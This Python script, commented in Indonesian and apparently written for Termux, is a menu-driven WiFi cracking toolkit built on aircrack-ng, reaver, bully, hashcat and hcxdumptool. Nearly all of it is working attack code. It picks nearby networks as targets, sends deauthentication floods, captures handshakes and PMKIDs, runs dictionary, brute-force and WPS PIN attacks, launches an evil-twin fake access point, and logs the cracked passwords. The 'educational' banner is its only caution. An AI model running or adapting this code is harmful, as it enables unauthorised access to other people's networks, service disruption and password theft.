import os
import subprocess
import time
import json
import threading
from datetime import datetime

# Setup logging untuk WiFi cracking
CRACK_LOG_DIR = "wifi_crack_logs"
if not os.path.exists(CRACK_LOG_DIR):
    os.makedirs(CRACK_LOG_DIR)

def setup_wifi_cracking():
    """Setup environment untuk WiFi cracking"""
    print("\n🔧 SETUP WIFI CRACKING ENVIRONMENT")
    print("=" * 50)
    
    required_tools = [
        ("aircrack-ng", "aircrack-ng"),
        ("reaver", "reaver"), 
        ("bully", "bully"),
        ("crunch", "crunch"),
        ("hashcat", "hashcat"),
        ("pyrit", "pyrit")
    ]
    
    missing_tools = []
    
    for tool, pkg_name in required_tools:
        try:
            result = subprocess.run([tool, "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print(f"✅ {tool}: Installed")
            else:
                print(f"❌ {tool}: Missing")
                missing_tools.append(pkg_name)
        except:
            print(f"❌ {tool}: Missing")
            missing_tools.append(pkg_name)
    
    if missing_tools:
        print(f"\n📦 Installing missing tools...")
        for tool in missing_tools:
            try:
                subprocess.run(["pkg", "install", "-y", tool], check=True)
                print(f"✅ {tool}: Installed")
            except:
                print(f"❌ Failed to install {tool}")
    else:
        print("\n🎉 All tools are ready!")

def advanced_wifi_scan():
    """Advanced WiFi scanning dengan berbagai metode"""
    print("\n📡 ADVANCED WIFI SCANNING")
    print("=" * 50)
    
    networks = []
    
    # Method 1: Menggunakan airodump-ng
    try:
        print("\n🔄 Method 1: Airodump-ng Scan...")
        # Monitor mode scan
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        time.sleep(2)
        
        # Start monitoring
        scan_proc = subprocess.Popen([
            "airodump-ng", 
            "--write", f"{CRACK_LOG_DIR}/scan",
            "--output-format", "csv",
            "wlan0"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(10)  # Scan selama 10 detik
        scan_proc.terminate()
        
        # Parse results
        if os.path.exists(f"{CRACK_LOG_DIR}/scan-01.csv"):
            with open(f"{CRACK_LOG_DIR}/scan-01.csv", 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if 'Station' in line:
                        break
                    parts = line.split(',')
                    if len(parts) > 13 and parts[0].strip():
                        network = {
                            'bssid': parts[0].strip(),
                            'essid': parts[13].strip(),
                            'channel': parts[3].strip(),
                            'encryption': parts[5].strip(),
                            'power': parts[8].strip()
                        }
                        networks.append(network)
            
            print(f"✅ Found {len(networks)} networks with airodump-ng")
            
    except Exception as e:
        print(f"❌ Airodump-ng failed: {e}")
    
    # Method 2: Menggunakan termux-wifi-scaninfo (fallback)
    if not networks:
        try:
            print("\n🔄 Method 2: Termux API Scan...")
            result = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                wifi_data = json.loads(result.stdout)
                for net in wifi_data:
                    networks.append({
                        'bssid': net.get('bssid', 'N/A'),
                        'essid': net.get('ssid', 'Hidden'),
                        'channel': str(net.get('frequency_mhz', 0)),
                        'encryption': 'WPA2' if 'WPA' in str(net) else 'Unknown',
                        'power': str(net.get('rssi', 0))
                    })
                print(f"✅ Found {len(networks)} networks with Termux API")
        except Exception as e:
            print(f"❌ Termux API scan failed: {e}")
    
    # Display results
    if networks:
        print(f"\n📊 SCAN RESULTS: {len(networks)} NETWORKS FOUND")
        print("=" * 80)
        print(f"{'NO':<3} {'SSID':<20} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<10}")
        print("-" * 80)
        
        for i, net in enumerate(networks[:20], 1):  # Limit to 20 networks
            ssid = net['essid'][:18] + '..' if len(net['essid']) > 18 else net['essid']
            bssid = net['bssid'][:16] if net['bssid'] != 'N/A' else 'N/A'
            
            print(f"{i:<3} {ssid:<20} {bssid:<18} {net['channel']:<4} {net['power']:<6} {net['encryption']:<10}")
    
    return networks

def wpa2_psk_crack():
    """WPA2-PSK Cracking menggunakan berbagai metode"""
    print("\n🔓 WPA2-PSK CRACKING TOOLKIT")
    print("=" * 50)
    
    networks = advanced_wifi_scan()
    if not networks:
        print("❌ No networks found to crack")
        return
    
    # Pilih target network
    try:
        target_num = int(input("\n🎯 Select target network number: ")) - 1
        if 0 <= target_num < len(networks):
            target = networks[target_num]
            print(f"\n🎯 TARGET SELECTED:")
            print(f"   SSID: {target['essid']}")
            print(f"   BSSID: {target['bssid']}")
            print(f"   Channel: {target['channel']}")
            print(f"   Encryption: {target['encryption']}")
        else:
            print("❌ Invalid selection")
            return
    except ValueError:
        print("❌ Please enter a valid number")
        return
    
    # Pilih metode cracking
    print("\n🔧 SELECT CRACKING METHOD:")
    print("1. Dictionary Attack (Fast)")
    print("2. Brute Force (Comprehensive)")
    print("3. WPS Pin Attack")
    print("4. PMKID Attack")
    print("5. Evil Twin Attack")
    
    try:
        method = int(input("\nSelect method (1-5): "))
    except ValueError:
        print("❌ Invalid selection")
        return
    
    if method == 1:
        dictionary_attack(target)
    elif method == 2:
        brute_force_attack(target)
    elif method == 3:
        wps_attack(target)
    elif method == 4:
        pmkid_attack(target)
    elif method == 5:
        evil_twin_attack(target)
    else:
        print("❌ Invalid method selected")

def dictionary_attack(target):
    """Dictionary attack pada WPA2"""
    print(f"\n📚 DICTIONARY ATTACK ON {target['essid']}")
    print("=" * 50)
    
    # Capture handshake terlebih dahulu
    print("🔄 Step 1: Capturing WPA handshake...")
    
    try:
        # Deauthenticate clients untuk trigger handshake
        print("   Sending deauth packets...")
        deauth_proc = subprocess.Popen([
            "aireplay-ng", 
            "--deauth", "10",
            "-a", target['bssid'],
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Capture handshake
        print("   Capturing handshake...")
        capture_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", target['bssid'],
            "--channel", target['channel'],
            "--write", f"{CRACK_LOG_DIR}/handshake",
            "wlan0"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(15)
        capture_proc.terminate()
        deauth_proc.terminate()
        
        # Cek jika handshake berhasil di-capture
        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
        if os.path.exists(handshake_file):
            print("✅ WPA handshake captured!")
            
            # Dictionary attack dengan aircrack-ng
            print("🔄 Step 2: Running dictionary attack...")
            
            # Gunasi wordlist default atau buat custom
            wordlists = [
                "/usr/share/wordlists/rockyou.txt",
                "/usr/share/wordlists/passwords.txt",
                f"{CRACK_LOG_DIR}/custom_wordlist.txt"
            ]
            
            # Buat custom wordlist jika tidak ada
            if not os.path.exists(wordlists[2]):
                create_custom_wordlist()
            
            for wordlist in wordlists:
                if os.path.exists(wordlist):
                    print(f"   Trying wordlist: {os.path.basename(wordlist)}")
                    
                    result = subprocess.run([
                        "aircrack-ng",
                        handshake_file,
                        "-w", wordlist,
                        "-l", f"{CRACK_LOG_DIR}/password_found.txt"
                    ], capture_output=True, text=True, timeout=300)
                    
                    if "KEY FOUND" in result.stdout:
                        print("🎉 PASSWORD CRACKED!")
                        # Extract password dari output
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if "KEY FOUND" in line:
                                password = line.split('[')[1].split(']')[0]
                                print(f"🔑 Password: {password}")
                                
                                # Save to file
                                with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                                    f.write(f"{target['essid']} : {password} : {datetime.now()}\n")
                                break
                        return
                    else:
                        print(f"   ❌ No password found in {os.path.basename(wordlist)}")
            
            print("❌ Password not found in any wordlist")
            
        else:
            print("❌ Failed to capture WPA handshake")
            
    except Exception as e:
        print(f"❌ Dictionary attack failed: {e}")

def brute_force_attack(target):
    """Brute force attack dengan pattern tertentu"""
    print(f"\n💪 BRUTE FORCE ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("🔄 Generating password patterns...")
    
    # Buat pattern berdasarkan SSID (common patterns)
    ssid = target['essid'].lower()
    patterns = []
    
    # Common patterns
    patterns.extend([
        f"{ssid}123", f"{ssid}1234", f"{ssid}12345",
        f"{ssid}2023", f"{ssid}2024",
        f"password", f"password123",
        f"admin", f"admin123",
        f"12345678", f"1234567890",
        f"qwerty", f"qwerty123"
    ])
    
    # Simpan patterns ke file
    pattern_file = f"{CRACK_LOG_DIR}/brute_patterns.txt"
    with open(pattern_file, "w") as f:
        for pattern in patterns:
            f.write(pattern + "\n")
    
    print(f"✅ Generated {len(patterns)} patterns")
    
    # Gunakan crunch untuk generate lebih banyak kombinasi
    try:
        print("🔄 Generating additional combinations with crunch...")
        subprocess.run([
            "crunch", "8", "12", "1234567890abcdef",
            "-o", f"{CRACK_LOG_DIR}/crunch_output.txt"
        ], timeout=30)
        
        # Combine files
        with open(f"{CRACK_LOG_DIR}/combined_wordlist.txt", "w") as outfile:
            # Patterns
            with open(pattern_file, "r") as infile:
                outfile.write(infile.read())
            
            # Crunch output (first 10000 lines)
            if os.path.exists(f"{CRACK_LOG_DIR}/crunch_output.txt"):
                with open(f"{CRACK_LOG_DIR}/crunch_output.txt", "r") as infile:
                    for i, line in enumerate(infile):
                        if i < 10000:
                            outfile.write(line)
                        else:
                            break
        
        print("🔄 Starting brute force attack...")
        # Lakukan attack similar to dictionary attack
        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
        if os.path.exists(handshake_file):
            result = subprocess.run([
                "aircrack-ng",
                handshake_file,
                "-w", f"{CRACK_LOG_DIR}/combined_wordlist.txt",
                "-l", f"{CRACK_LOG_DIR}/brute_password.txt"
            ], capture_output=True, text=True, timeout=600)
            
            if "KEY FOUND" in result.stdout:
                print("🎉 PASSWORD CRACKED WITH BRUTE FORCE!")
                lines = result.stdout.split('\n')
                for line in lines:
                    if "KEY FOUND" in line:
                        password = line.split('[')[1].split(']')[0]
                        print(f"🔑 Password: {password}")
                        with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                            f.write(f"{target['essid']} : {password} : BRUTE_FORCE : {datetime.now()}\n")
                        break
            else:
                print("❌ Brute force attack failed")
        
    except Exception as e:
        print(f"❌ Brute force attack failed: {e}")

def wps_attack(target):
    """WPS Pin attack menggunakan reaver atau bully"""
    print(f"\n📟 WPS PIN ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("🔍 Checking if WPS is enabled...")
    
    try:
        # Coba dengan reaver
        print("🔄 Trying Reaver attack...")
        reaver_proc = subprocess.Popen([
            "reaver",
            "-i", "wlan0",
            "-b", target['bssid'],
            "-vv",
            "-K", "1"  # Pixie dust attack
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Monitor output untuk progress
        for line in iter(reaver_proc.stdout.readline, ''):
            print(f"   {line.strip()}")
            if "WPS pin:" in line:
                pin = line.split("WPS pin:")[1].strip()
                print(f"🎉 WPS PIN FOUND: {pin}")
                reaver_proc.terminate()
                
                # Coba dapatkan password dengan pin
                get_password_with_pin(target, pin)
                return
                
            elif "rate limiting" in line.lower():
                print("❌ AP is rate limiting, trying bully...")
                reaver_proc.terminate()
                break
        
        # Jika reaver gagal, coba bully
        print("🔄 Trying Bully attack...")
        bully_proc = subprocess.Popen([
            "bully",
            "wlan0",
            "-b", target['bssid'],
            "-v", "3"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(bully_proc.stdout.readline, ''):
            print(f"   {line.strip()}")
            if "pin is" in line.lower():
                pin = line.split("pin is")[1].strip()
                print(f"🎉 WPS PIN FOUND: {pin}")
                bully_proc.terminate()
                get_password_with_pin(target, pin)
                return
        
        print("❌ WPS attack failed")
        
    except Exception as e:
        print(f"❌ WPS attack failed: {e}")

def get_password_with_pin(target, pin):
    """Dapatkan password menggunakan WPS pin"""
    try:
        print(f"🔄 Retrieving password with PIN {pin}...")
        
        result = subprocess.run([
            "reaver",
            "-i", "wlan0", 
            "-b", target['bssid'],
            "-p", pin,
            "-s", f"{CRACK_LOG_DIR}/reaver_output"
        ], capture_output=True, text=True, timeout=60)
        
        if "WPA PSK:" in result.stdout:
            lines = result.stdout.split('\n')
            for line in lines:
                if "WPA PSK:" in line:
                    password = line.split("WPA PSK:")[1].strip().strip("'")
                    print(f"🎉 PASSWORD FOUND: {password}")
                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                        f.write(f"{target['essid']} : {password} : WPS_PIN : {datetime.now()}\n")
                    return
        
        print("❌ Failed to retrieve password with PIN")
        
    except Exception as e:
        print(f"❌ Error retrieving password: {e}")

def pmkid_attack(target):
    """PMKID attack tanpa perlu handshake"""
    print(f"\n🎯 PMKID ATTACK ON {target['essid']}")
    print("=" * 50)
    
    try:
        print("🔄 Capturing PMKID...")
        
        # Gunakan hcxdumptool untuk capture PMKID
        pmkid_proc = subprocess.Popen([
            "hcxdumptool",
            "-i", "wlan0",
            "--enable_status=1",
            "-o", f"{CRACK_LOG_DIR}/pmkid_capture.pcapng"
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        time.sleep(30)  # Capture selama 30 detik
        pmkid_proc.terminate()
        
        # Convert ke format hashcat
        print("🔄 Converting to hashcat format...")
        subprocess.run([
            "hcxpcaptool",
            "-z", f"{CRACK_LOG_DIR}/pmkid_hash.txt",
            f"{CRACK_LOG_DIR}/pmkid_capture.pcapng"
        ], capture_output=True)
        
        if os.path.exists(f"{CRACK_LOG_DIR}/pmkid_hash.txt"):
            print("✅ PMKID hash captured!")
            
            # Crack dengan hashcat
            print("🔄 Cracking PMKID with hashcat...")
            result = subprocess.run([
                "hashcat",
                "-m", "16800",
                f"{CRACK_LOG_DIR}/pmkid_hash.txt",
                "/usr/share/wordlists/rockyou.txt",
                "--force"
            ], capture_output=True, text=True, timeout=300)
            
            if "Cracked" in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if ":" in line and len(line.split(':')) == 2:
                        hash_part, password = line.split(':')
                        print(f"🎉 PASSWORD CRACKED: {password}")
                        with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
                            f.write(f"{target['essid']} : {password} : PMKID : {datetime.now()}\n")
                        return
            
            print("❌ PMKID attack failed")
        else:
            print("❌ No PMKID captured")
            
    except Exception as e:
        print(f"❌ PMKID attack failed: {e}")

def evil_twin_attack(target):
    """Evil Twin attack untuk capture credentials"""
    print(f"\n👹 EVIL TWIN ATTACK ON {target['essid']}")
    print("=" * 50)
    
    print("⚠️  This method creates a fake access point")
    print("⚠️  For educational purposes only!")
    
    try:
        # Setup interface monitor
        print("🔄 Setting up monitor mode...")
        subprocess.run(["airmon-ng", "start", "wlan0"], capture_output=True)
        
        # Create fake AP dengan SSID yang sama
        print("🔄 Creating fake access point...")
        
        # Buat hostapd config
        with open(f"{CRACK_LOG_DIR}/hostapd.conf", "w") as f:
            f.write(f"""
interface=wlan0mon
driver=nl80211
ssid={target['essid']}_FREE
channel={target['channel']}
hw_mode=g
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
""")
        
        # Start fake AP
        ap_proc = subprocess.Popen([
            "hostapd", f"{CRACK_LOG_DIR}/hostapd.conf"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Setup DHCP server
        print("🔄 Setting up DHCP server...")
        subprocess.run([
            "dnsmasq", 
            "-C", "/dev/null",
            "-d",
            "-i", "wlan0mon",
            "--dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("✅ Fake AP is running!")
        print("📡 Waiting for clients to connect...")
        print("💡 Clients may connect thinking it's the real network")
        
        time.sleep(60)  # Run selama 1 menit
        
        # Cleanup
        ap_proc.terminate()
        subprocess.run(["pkill", "dnsmasq"])
        subprocess.run(["airmon-ng", "stop", "wlan0mon"])
        
        print("✅ Evil Twin attack completed")
        print("💡 Check logs for captured credentials")
        
    except Exception as e:
        print(f"❌ Evil Twin attack failed: {e}")

def create_custom_wordlist():
    """Buat custom wordlist berdasarkan common passwords"""
    print("🔄 Creating custom wordlist...")
    
    common_passwords = [
        "password", "password123", "admin", "admin123",
        "12345678", "123456789", "1234567890", "qwerty",
        "abc123", "password1", "12345", "1234",
        "111111", "000000", "123123", "monkey",
        "dragon", "sunshine", "princess", "letmein",
        "welcome", "shadow", "master", "123qwe",
        "654321", "superman", "1qaz2wsx", "password123",
        "iloveyou", "football", "baseball", "whatever"
    ]
    
    with open(f"{CRACK_LOG_DIR}/custom_wordlist.txt", "w") as f:
        for pwd in common_passwords:
            f.write(pwd + "\n")
    
    print("✅ Custom wordlist created!")

def wifi_cracking_menu():
    """Menu utama WiFi cracking"""
    while True:
        print("\n" + "=" * 60)
        print("           ADVANCED WIFI CRACKING TOOLKIT")
        print("=" * 60)
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        print("=" * 60)
        
        print("\n🔧 MAIN MENU:")
        print("1. 🔧 Setup Cracking Environment")
        print("2. 📡 Advanced WiFi Scan")
        print("3. 🔓 WPA2-PSK Cracking Toolkit")
        print("4. 📊 View Cracked Passwords")
        print("5. 🛡️  WiFi Security Audit")
        print("6. 🏠 Back to Main Menu")
        
        try:
            choice = input("\nSelect option (1-6): ").strip()
            
            if choice == "1":
                setup_wifi_cracking()
            elif choice == "2":
                advanced_wifi_scan()
            elif choice == "3":
                wpa2_psk_crack()
            elif choice == "4":
                view_cracked_passwords()
            elif choice == "5":
                wifi_security_audit()
            elif choice == "6":
                break
            else:
                print("❌ Invalid selection")
                
        except KeyboardInterrupt:
            print("\n\n⚠️  Returning to main menu...")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

def view_cracked_passwords():
    """Lihat password yang berhasil di-crack"""
    cracked_file = f"{CRACK_LOG_DIR}/cracked_passwords.txt"
    
    if os.path.exists(cracked_file):
        print(f"\n📋 CRACKED PASSWORDS:")
        print("=" * 60)
        with open(cracked_file, "r") as f:
            content = f.read()
            if content:
                print(content)
            else:
                print("No passwords cracked yet")
    else:
        print("❌ No cracked passwords file found")

def wifi_security_audit():
    """Audit keamanan WiFi"""
    print("\n🛡️  WIFI SECURITY AUDIT")
    print("=" * 50)
    
    networks = advanced_wifi_scan()
    if not networks:
        return
    
    print("\n🔍 SECURITY ANALYSIS:")
    
    for net in networks[:10]:  # Analyze first 10 networks
        security_issues = []
        
        # Check encryption
        if 'WEP' in net['encryption']:
            security_issues.append("❌ WEP - Easily crackable")
        if 'WPA' in net['encryption'] and 'WPA2' not in net['encryption']:
            security_issues.append("⚠️  WPA - Vulnerable to attacks")
        if 'OPEN' in net['encryption']:
            security_issues.append("🔓 OPEN - No security")
        
        # Check signal strength
        try:
            power = int(net['power'])
            if power > -50:
                security_issues.append("📡 Strong signal - More visible to attackers")
        except:
            pass
        
        # Check if hidden
        if net['essid'] == 'Hidden':
            security_issues.append("👻 Hidden SSID - Basic protection")
        
        # Display results
        if security_issues:
            print(f"\n📶 {net['essid']}:")
            for issue in security_issues:
                print(f"   {issue}")

# Tambahkan menu ini ke main program utama
def main():
    """Menu utama program yang diperbarui"""
    setup_logging()
    
    while True:
        clear_screen()
        display_header()
        
        print("\n📋 ADVANCED MAIN MENU:")
        print("1. 🔗 Website Checker")
        print("2. 🔤 Random String Generator") 
        print("3. 📡 WiFi Checker & Tools")
        print("4. 🔓 WiFi Cracking Toolkit")
        print("5. 💻 System Information")
        print("6. 🚀 System Setup & Requirements")
        print("7. 🚪 Exit")
        
        try:
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == "1":
                website_checker()
            elif choice == "2":
                random_string_generator()
            elif choice == "3":
                wifi_checker()
            elif choice == "4":
                wifi_cracking_menu()
            elif choice == "5":
                show_detailed_system_info()
            elif choice == "6":
                system_setup_requirements()
            elif choice == "7":
                print("\n👋 Thank you for using the program!")
                break
            else:
                print("❌ Invalid selection")
                
        except KeyboardInterrupt:
            print("\n\n👋 Program terminated by user")
            break
